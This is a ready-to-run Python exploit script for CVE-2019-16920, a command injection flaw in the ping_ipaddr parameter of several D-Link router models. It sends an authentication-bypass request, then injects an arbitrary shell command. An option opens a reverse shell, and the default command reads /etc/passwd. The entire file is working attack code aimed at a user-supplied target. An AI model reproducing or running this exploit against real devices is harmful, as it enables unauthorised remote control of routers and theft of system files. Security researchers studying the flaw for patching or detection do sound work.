#!/usr/bin/python3
# Imports:
import sys
import payloads
import requests
from urllib.parse import quote_plus

"""
Service: D-Link Routers
Version: DIR-655, DIR-866L, DIR-652, DHP-1565, DIR-855L, DAP-1533, DIR-862L, DIR-615, DIR-835, DIR-825
Vulnerability Type: RCE via Command Injection (Improper Sanitization of Newline Characters)
Vulnerable Component: /apply_sec.cgi, more specifically the ping_ipaddr parameter
CVE: https://www.cvedetails.com/cve/CVE-2019-16920/
"""
# Exploit:
def exploit(target, command):
    requests.post(f"{target}/apply_sec.cgi",
                  headers={"Referer": f"{target}","Content-type": "application/x-www-form-urlencoded"},
                  data={"html_response_page": "login_pic.asp&login_name=YWRtaW4%3D&log_pass=&action=do_graph_auth&login_n=admin&tmp_log_pass=&graph_code=&session_id=62384"},
                  verify=False)
    exploit_rsp = requests.post(f"{target}/apply_sec.cgi",
                                  headers={"Referer": f"{target}","Content-type": "application/x-www-form-urlencoded"},
                                  data={"html_response_page": f"login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0a{command}"},
                                  verify=False)
    print(exploit_rsp.text)
# Main:
def main(target):
    # Format Validation:
    if target.endswith("/"):
        target = target[:-1]
    # Payloads:
    command = input("Enter the command to execute on target (or rshell for a reverse shell): ")
    if command.lower() == 'rshell':
        command = payloads.rshell()
    elif command == "":
        command = "cat /etc/passwd"
    # Exploit:
    exploit(target, quote_plus(command))
if __name__ == "__main__":
    try:
        main(sys.argv[1])
    except IndexError:
        print(f"Usage: {sys.argv[0]} http://<target address:target port>")

